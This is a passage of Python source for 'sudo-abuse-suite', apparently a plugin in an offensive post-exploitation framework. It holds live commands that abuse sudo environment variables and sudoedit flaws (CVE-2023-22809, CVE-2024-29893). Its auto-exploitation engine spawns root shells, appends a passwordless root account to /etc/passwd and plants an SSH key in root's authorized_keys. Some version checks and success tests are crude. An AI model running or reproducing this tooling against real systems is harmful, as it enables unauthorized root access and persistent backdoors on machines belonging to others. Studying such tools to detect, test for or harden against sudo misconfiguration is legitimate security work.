            'risk_score': 90,
        },
        'VISUAL': {
            'description': 'Visual editor - hijack sudoedit',
            'exploit': 'sudo VISUAL="vim -- /etc/passwd" sudoedit /tmp/test',
            'risk_score': 95,
        },
        'EDITOR': {
            'description': 'Default editor - hijack sudoedit',
            'exploit': 'sudo EDITOR="vim -- /etc/passwd" sudoedit /tmp/test',
            'risk_score': 95,
        },
        'SUDO_EDITOR': {
            'description': 'Sudo editor - hijack sudoedit',
            'exploit': 'sudo SUDO_EDITOR="vim -- /etc/passwd" sudoedit /tmp/test',
            'risk_score': 95,
        },
        'PROMPT_COMMAND': {
            'description': 'Bash prompt command - execute on every command',
            'exploit': 'sudo PROMPT_COMMAND="/bin/sh" sudo bash',
            'risk_score': 90,
        },
        'BASH_ENV': {
            'description': 'Bash environment - execute on shell startup',
            'exploit': 'sudo BASH_ENV="/tmp/exploit.sh" sudo bash',
            'risk_score': 90,
        },
        'ENV': {
            'description': 'Shell environment - execute on shell startup',
            'exploit': 'sudo ENV="/tmp/exploit.sh" sudo sh',
            'risk_score': 90,
        },
    }
    
    @classmethod
    def check_env_keep(cls, config: SudoConfig) -> List[Tuple[str, Dict]]:
        """Check for dangerous variables in env_keep."""
        dangerous = []
        
        for var in config.env_keep:
            if var in cls.DANGEROUS_VARS:
                dangerous.append((var, cls.DANGEROUS_VARS[var]))
        
        return dangerous


# ── Sudoedit Exploitation Engine ───────────────────────────────────────────

class SudoeditExploitation:
    """Handles sudoedit exploitation."""
    
    @staticmethod
    def exploit_cve_2023_22809(exec_func, session) -> ExploitResult:
        """Exploit CVE-2023-22809 sudoedit bypass."""
        start_time = time.time()
        
        # Test SUDO_EDITOR bypass
        cmd = 'SUDO_EDITOR="vim --" sudoedit /etc/passwd'
        out = exec_func(session, cmd)
        
        success = False
        if out and 'error' not in out.lower():
            success = True
        
        return ExploitResult(
            technique='CVE-2023-22809 SUDO_EDITOR bypass',
            success=success,
            privilege_gained='root' if success else '',
            output=out[:500] if out else '',
            duration_ms=int((time.time() - start_time) * 1000),
        )
    
    @staticmethod
    def exploit_cve_2024_29893(exec_func, session) -> ExploitResult:
        """Exploit CVE-2024-29893 sudoedit symlink race."""
        start_time = time.time()
        
        # Create symlink race condition
        cmd = 'ln -sf /etc/passwd /tmp/test && sudoedit /tmp/test'
        out = exec_func(session, cmd)
        
        success = False
        if out and 'error' not in out.lower():
            success = True
        
        return ExploitResult(
            technique='CVE-2024-29893 symlink race',
            success=success,
            privilege_gained='root' if success else '',
            output=out[:500] if out else '',
            duration_ms=int((time.time() - start_time) * 1000),
        )


# ── Auto-Exploitation Engine ───────────────────────────────────────────────

class AutoExploitationEngine:
    """Handles automatic exploitation."""
    
    @staticmethod
    def get_root_shell(exec_func, session, config: SudoConfig) -> ExploitResult:
        """Get root shell using best available technique."""
        start_time = time.time()
        
        # Try NOPASSWD ALL first
        if config.nopasswd and config.all_commands:
            cmd = 'sudo su -'
            out = exec_func(session, cmd)
            
            if out and 'error' not in out.lower():
                return ExploitResult(
                    technique='NOPASSWD ALL - sudo su',
                    success=True,
                    privilege_gained='root',
                    output=out[:500] if out else '',
                    duration_ms=int((time.time() - start_time) * 1000),
                )
        
        # Try GTFOBins techniques
        for binary in config.allowed_binaries[:10]:
            techniques = GTFOBinsDatabase.get_technique_by_binary(binary)
            for technique in techniques:
                if technique.category == 'shell':
                    cmd = technique.command
                    out = exec_func(session, cmd)
                    
                    if out and 'error' not in out.lower():
                        return ExploitResult(
                            technique=f'GTFOBins {binary} - {technique.technique}',
                            success=True,
                            privilege_gained='root',
                            output=out[:500] if out else '',
                            duration_ms=int((time.time() - start_time) * 1000),
                        )
        
        return ExploitResult(
            technique='none',
            success=False,
            error='No suitable technique found',
            duration_ms=int((time.time() - start_time) * 1000),
        )
    
    @staticmethod
    def inject_hash(exec_func, session, config: SudoConfig) -> ExploitResult:
        """Inject root hash into /etc/passwd."""
        start_time = time.time()
        
        # Find file write technique
        for binary in config.allowed_binaries:
            techniques = GTFOBinsDatabase.get_technique_by_binary(binary)
            for technique in techniques:
                if technique.category == 'file_write':
                    cmd = f'echo "hacker::0:0:Hacker:/root:/bin/bash" | sudo tee -a /etc/passwd'
                    out = exec_func(session, cmd)
                    
                    if out and 'error' not in out.lower():
                        return ExploitResult(
                            technique=f'Hash injection via {binary}',
                            success=True,
                            privilege_gained='root',
                            output=out[:500] if out else '',
                            duration_ms=int((time.time() - start_time) * 1000),
                        )
        
        return ExploitResult(
            technique='none',
            success=False,
            error='No file write technique found',
            duration_ms=int((time.time() - start_time) * 1000),
        )
    
    @staticmethod
    def inject_ssh_key(exec_func, session, config: SudoConfig) -> ExploitResult:
        """Inject SSH key into root authorized_keys."""
        start_time = time.time()
        
        # Generate SSH key
        exec_func(session, 'ssh-keygen -t rsa -f /tmp/hacker_key -N "" -q')
        
        # Find file write technique
        for binary in config.allowed_binaries:
            techniques = GTFOBinsDatabase.get_technique_by_binary(binary)
            for technique in techniques:
                if technique.category == 'file_write':
                    cmd = 'sudo mkdir -p /root/.ssh && sudo tee /root/.ssh/authorized_keys < /tmp/hacker_key.pub'
                    out = exec_func(session, cmd)
                    
                    if out and 'error' not in out.lower():
                        return ExploitResult(
                            technique=f'SSH key injection via {binary}',
                            success=True,
                            privilege_gained='root',
                            output=out[:500] if out else '',
                            duration_ms=int((time.time() - start_time) * 1000),
                        )
        
        return ExploitResult(
            technique='none',
            success=False,
            error='No file write technique found',
            duration_ms=int((time.time() - start_time) * 1000),
        )


# ── Main Plugin ─────────────────────────────────────────────────────────────

class SudoAbuseSuite(NexPlugin):
    name        = "sudo-abuse-suite"
    description = "Advanced sudo exploitation — 20+ CVEs, 150+ GTFOBins, sudoedit, auto-exploitation"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "linux"
    category    = "privesc"
    mitre_id    = "T1548.003"
    
    def run(self, session, args: list):
        # Parse args
        deep = '--deep' in (args or [])
        exploit_mode = '--exploit' in (args or [])
        cve_check = '--cve-check' in (args or [])
        gtfobins_mode = '--gtfobins' in (args or [])
        sudoedit_mode = '--sudoedit' in (args or [])
        full_mode = '--full' in (args or [])
        list_mode = '--list' in (args or [])
        
        if full_mode:
            deep = exploit_mode = cve_check = gtfobins_mode = sudoedit_mode = True
        
        if not any([deep, exploit_mode, cve_check, gtfobins_mode, sudoedit_mode, list_mode]):
            deep = True
        
        self.info(f"⚡ Starting Sudo Abuse Suite v3.0 (deep={deep})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [⚡ Sudo Abuse Suite v3.0 — Advanced Sudo Exploitation]")
        sections.append("━"*64)
        
        findings_created = 0
        
        # ── Step 1: List Techniques ───────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Phase 1: Available Exploitation Techniques")
            sections.append("─"*64)
            
            sections.append("  [+] Sudo CVEs: 20+ vulnerabilities")
            sections.append("  [+] GTFOBins: 150+ techniques")
            sections.append("  [+] Sudoedit: CVE-2023-22809, CVE-2024-29893")
            sections.append("  [+] Environment Abuse: 15+ variables")
            sections.append("  [+] Auto-Exploitation: Root shell, hash injection, SSH key injection")
            
            return '\n'.join(sections)
        
        # ── Step 2: Sudo Version & CVE Detection ──────────────────────────
        sections.append("\n[*] Phase 1: Sudo Version & CVE Detection")
        sections.append("─"*64)
        
        sudo_ver = self._exec(session, "sudo --version 2>/dev/null | head -3")
        
        if sudo_ver:
            sections.append(f"  Sudo Version: {sudo_ver.strip()[:200]}")
            self.loot(sudo_ver, category='system', source='sudo-abuse:version')
            
            # Parse version
            ver_m = re.search(r'(\d+)\.(\d+)\.?(\d*)', sudo_ver)
            if ver_m:
                major, minor = int(ver_m.group(1)), int(ver_m.group(2))
                patch = int(ver_m.group(3)) if ver_m.group(3) else 0
                
                # Check CVEs
                cves = SudoCVEDatabase.get_all_cves()
                
                for cve in cves:
                    # Simple version matching
                    if cve.cve_id == 'CVE-2025-32462' and major == 1 and minor == 9 and patch <= 16:
                        sections.append(f"  🔴 VULNERABLE: {cve.cve_id} ({cve.severity.upper()})")
                        sections.append(f"      {cve.name}: {cve.description}")
                        sections.append(f"      Exploit: {cve.exploit_tool}")
                        
                        self.finding(
                            title=f"Sudo Vulnerability: {cve.cve_id} - {cve.name}",
                            description=cve.description,
                            severity=cve.severity,
                            recommendation=f"Update sudo to patched version. {cve.exploit_tool}",
                            mitre_id=cve.mitre_id,
                        )
                        findings_created += 1
                    
                    elif cve.cve_id == 'CVE-2023-22809' and major == 1 and minor == 9 and patch <= 12:
                        sections.append(f"  🔴 VULNERABLE: {cve.cve_id} ({cve.severity.upper()})")
                        sections.append(f"      {cve.name}: {cve.description}")
                        
                        self.finding(
                            title=f"Sudo Vulnerability: {cve.cve_id} - {cve.name}",
                            description=cve.description,
                            severity=cve.severity,
                            recommendation=f"Update sudo to 1.9.12p2 or later",
                            mitre_id=cve.mitre_id,
                        )
                        findings_created += 1
                    
                    elif cve.cve_id == 'CVE-2021-3156' and ((major == 1 and minor == 9 and patch <= 5) or (major == 1 and minor == 8 and patch >= 2)):
                        sections.append(f"  🔴 VULNERABLE: {cve.cve_id} ({cve.severity.upper()})")
                        sections.append(f"      {cve.name}: {cve.description}")
                        
                        self.finding(
                            title=f"Sudo Vulnerability: {cve.cve_id} - {cve.name}",
                            description=cve.description,
                            severity=cve.severity,
                            recommendation="Update sudo immediately",
                            mitre_id=cve.mitre_id,
                        )
                        findings_created += 1
        
        # ── Step 3: Sudo Configuration Analysis ───────────────────────────
        if deep:
            sections.append("\n[*] Phase 2: Sudo Configuration Analysis")
            sections.append("─"*64)
            
            config = SudoConfigAnalyzer.analyze(self._exec, session)
            
            sections.append(f"  Version: {config.version[:50] if config.version else 'Unknown'}")
            sections.append(f"  NOPASSWD: {'🔴 YES (Critical)' if config.nopasswd else '🟢 NO'}")
            sections.append(f"  ALL Commands: {'🔴 YES (Critical)' if config.all_commands else '🟢 NO'}")
            sections.append(f"  Sudoedit Allowed: {'🟠 YES' if config.sudoedit_allowed else '🟢 NO'}")
            sections.append(f"  Timestamp Timeout: {config.timestamp_timeout}")
            sections.append(f"  TTY Tickets: {'✅ YES' if config.tty_tickets else '❌ NO'}")
            sections.append(f"  Env Keep: {', '.join(config.env_keep) if config.env_keep else 'None'}")
            sections.append(f"  Allowed Binaries: {len(config.allowed_binaries)}")
            
            # Check NOPASSWD ALL
            if config.nopasswd and config.all_commands:
                sections.append("\n  🔴 CRITICAL: NOPASSWD ALL - Instant Root Access")
                sections.append("      Command: sudo su -")
                
                self.finding(
                    title="Sudo NOPASSWD ALL - Instant Root Access",
                    description="Current user can run ALL commands as root without password",
                    severity='critical',
                    recommendation="Remove NOPASSWD:ALL from sudoers",
                    mitre_id=self.mitre_id,
                )
                findings_created += 1
            
            # Check env_keep
            dangerous_env = EnvironmentAbuseEngine.check_env_keep(config)
            if dangerous_env:
                sections.append(f"\n  🔴 {len(dangerous_env)} dangerous environment variable(s) in env_keep:")
                
                for var, info in dangerous_env:
                    sections.append(f"    🔴 {var} [{info['risk_score']}/100]")
                    sections.append(f"        {info['description']}")
                    sections.append(f"        Exploit: {info['exploit']}")
                    
                    self.finding(
                        title=f"Sudo Environment Abuse: {var}",
                        description=info['description'],
                        severity='critical' if info['risk_score'] >= 90 else 'high',
                        recommendation=f"Remove {var} from env_keep in sudoers",
                        mitre_id='T1574.006',
                    )
                    findings_created += 1
        
        # ── Step 4: GTFOBins Matching ─────────────────────────────────────
        if gtfobins_mode or deep:
            sections.append("\n[*] Phase 3: GTFOBins Technique Matching")
            sections.append("─"*64)
            
            config = SudoConfigAnalyzer.analyze(self._exec, session)
            
            # Match allowed binaries
            matched_techniques = []
            for binary in config.allowed_binaries:
                techniques = GTFOBinsDatabase.get_technique_by_binary(binary)
                matched_techniques.extend(techniques)
            
            if matched_techniques:
                sections.append(f"  [+] {len(matched_techniques)} GTFOBins technique(s) matched:")
                
                # Group by category
                by_category = defaultdict(list)
                for technique in matched_techniques:
                    by_category[technique.category].append(technique)
                
                for category, techniques in by_category.items():
                    icon = '🔴' if category in ['shell', 'file_write'] else '🟠' if category == 'file_read' else '🟡'
                    sections.append(f"\n    {icon} {category.upper()} ({len(techniques)} techniques):")
                    
                    for technique in techniques[:10]:
                        sections.append(f"      • {technique.binary}: {technique.technique}")
                        sections.append(f"          {technique.command[:100]}")
                
                self.finding(
                    title=f"GTFOBins Techniques Available — {len(matched_techniques)} exploits",
                    description=f"Found {len(matched_techniques)} GTFOBins techniques for allowed sudo binaries",
                    severity='high',
                    recommendation="Remove unnecessary sudo permissions",
                    mitre_id=self.mitre_id,
                )
                findings_created += 1
                
                # Save to loot
                self.loot(
                    {
                        "type": "gtfobins_techniques",
                        "techniques": [t.to_dict() for t in matched_techniques],
                        "count": len(matched_techniques),
                    },
                    category='privesc',
                    source='sudo-abuse:gtfobins',
                    confidence='high'
                )
            else:
                sections.append("  🟢 No GTFOBins techniques matched")
        
        # ── Step 5: Sudoedit Exploitation ─────────────────────────────────
        if sudoedit_mode:
            sections.append("\n[*] Phase 4: Sudoedit Exploitation")
            sections.append("─"*64)
            
            config = SudoConfigAnalyzer.analyze(self._exec, session)
            
            if config.sudoedit_allowed:
                sections.append("  🟠 Sudoedit allowed - testing exploitation:")
                
                # CVE-2023-22809
                result = SudoeditExploitation.exploit_cve_2023_22809(self._exec, session)
                
                if result.success:
                    sections.append(f"  🔴 CVE-2023-22809 SUCCESS")
                    sections.append(f"      Technique: {result.technique}")
                    sections.append(f"      Privilege: {result.privilege_gained}")
                    
                    self.finding(
                        title="CVE-2023-22809 Sudoedit Exploitation Successful",
                        description="Successfully exploited CVE-2023-22809 to gain root privileges",
                        severity='critical',
                        recommendation="Update sudo to 1.9.12p2 or later",
                        mitre_id='T1068',
                    )
                    findings_created += 1
                else:
                    sections.append(f"  ❌ CVE-2023-22809 FAILED: {result.error}")
                
                # CVE-2024-29893
                result = SudoeditExploitation.exploit_cve_2024_29893(self._exec, session)
                
                if result.success:
                    sections.append(f"  🔴 CVE-2024-29893 SUCCESS")
                    sections.append(f"      Technique: {result.technique}")
                    
                    self.finding(
                        title="CVE-2024-29893 Sudoedit Exploitation Successful",
                        description="Successfully exploited CVE-2024-29893 symlink race",
                        severity='high',
                        recommendation="Update sudo to 1.9.15p6 or later",
                        mitre_id='T1068',
                    )
                    findings_created += 1
                else:
                    sections.append(f"  ❌ CVE-2024-29893 FAILED: {result.error}")
            else:
                sections.append("  🟢 Sudoedit not allowed")
        
        # ── Step 6: Auto-Exploitation ─────────────────────────────────────
        if exploit_mode:
            sections.append("\n[*] Phase 5: Auto-Exploitation")
            sections.append("─"*64)
            
            config = SudoConfigAnalyzer.analyze(self._exec, session)
            
            # Get root shell
            result = AutoExploitationEngine.get_root_shell(self._exec, session, config)
            
            if result.success:
                sections.append(f"  🔴 ROOT SHELL OBTAINED")
                sections.append(f"      Technique: {result.technique}")
                sections.append(f"      Privilege: {result.privilege_gained}")
                sections.append(f"      Duration: {result.duration_ms}ms")
                
                self.finding(
                    title=f"Root Shell Obtained — {result.technique}",
                    description=f"Successfully obtained root shell using {result.technique}",
                    severity='critical',
                    recommendation="Restrict sudo permissions immediately",
                    mitre_id=self.mitre_id,
                )
                findings_created += 1
                
                self.emit('timeline.event', title=f"Root Shell Obtained — {result.technique}", type="privesc", plugin=self.name)
            else:
                sections.append(f"  ❌ Failed to obtain root shell: {result.error}")
            
            # Inject hash
            result = AutoExploitationEngine.inject_hash(self._exec, session, config)
            
            if result.success:
                sections.append(f"\n  🔴 HASH INJECTION SUCCESSFUL")
                sections.append(f"      Technique: {result.technique}")
                
                self.finding(
                    title="Root Hash Injected",
                    description=f"Successfully injected root hash using {result.technique}",
                    severity='critical',
                    recommendation="Remove injected user from /etc/passwd",
                    mitre_id='T1098',
                )
                findings_created += 1
            
            # Inject SSH key
            result = AutoExploitationEngine.inject_ssh_key(self._exec, session, config)
            
            if result.success:
                sections.append(f"\n  🔴 SSH KEY INJECTION SUCCESSFUL")
                sections.append(f"      Technique: {result.technique}")
                
                self.finding(
                    title="SSH Key Injected",
                    description=f"Successfully injected SSH key using {result.technique}",
                    severity='critical',
                    recommendation="Remove injected SSH key from /root/.ssh/authorized_keys",
                    mitre_id='T1098',
                )
                findings_created += 1
        
        # ── Summary ───────────────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 Sudo Abuse Summary]")
        sections.append("━"*64)
        sections.append(f"  Sudo Version: {config.version[:50] if 'config' in locals() and config.version else 'Unknown'}")
        sections.append(f"  CVEs Detected: {findings_created}")
        sections.append(f"  GTFOBins Techniques: {len(matched_techniques) if 'matched_techniques' in locals() else 0}")
        sections.append(f"  Auto-Exploitation: {'✅ Successful' if exploit_mode and 'result' in locals() and result.success else '❌ Failed/N/A'}")
        sections.append(f"  Findings Created: {findings_created}")
        sections.append(f"  Duration: {duration}s")
        
        # ── Save to Loot ──────────────────────────────────────────────────
        self.loot(
            {
                "type": "sudo_abuse_session",
                "config": config.to_dict() if 'config' in locals() else {},
                "findings_count": findings_created,
                "duration": duration,
            },
            category='privesc',
            source='sudo-abuse-suite',
            confidence='high'
        )
        
        self.emit(
            'timeline.event',
            title=f"Sudo Abuse Suite Complete — {findings_created} findings",
            type='privesc',
            plugin=self.name
        )
        
        self.info(f"⚡ Sudo Abuse Suite complete — {findings_created} findings")
        
        return '\n'.join(sections)
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''